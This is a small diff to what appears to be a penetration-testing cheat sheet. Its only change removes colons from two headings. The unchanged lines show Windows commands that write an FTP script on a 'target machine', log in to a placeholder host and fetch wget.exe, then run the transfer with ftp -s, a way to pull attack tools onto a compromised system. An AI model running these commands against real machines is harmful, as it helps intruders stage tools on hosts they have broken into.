@@ -1,4 +1,4 @@
-#### Set up a ftp downloading script on the target machine:
+#### Set up a ftp downloading script on the target machine
 ```bash
 echo open IP 21 > ftp.txt
 echo USER acknak>> ftp.txt
@@ -9,7 +9,7 @@ echo GET wget.exe >> ftp.txt
 echo bye >> ftp.txt
 ```
 
-#### Download the prepared file:
+#### Download the prepared file
 
 ```bash
 ftp -v -n -s:ftp.txt
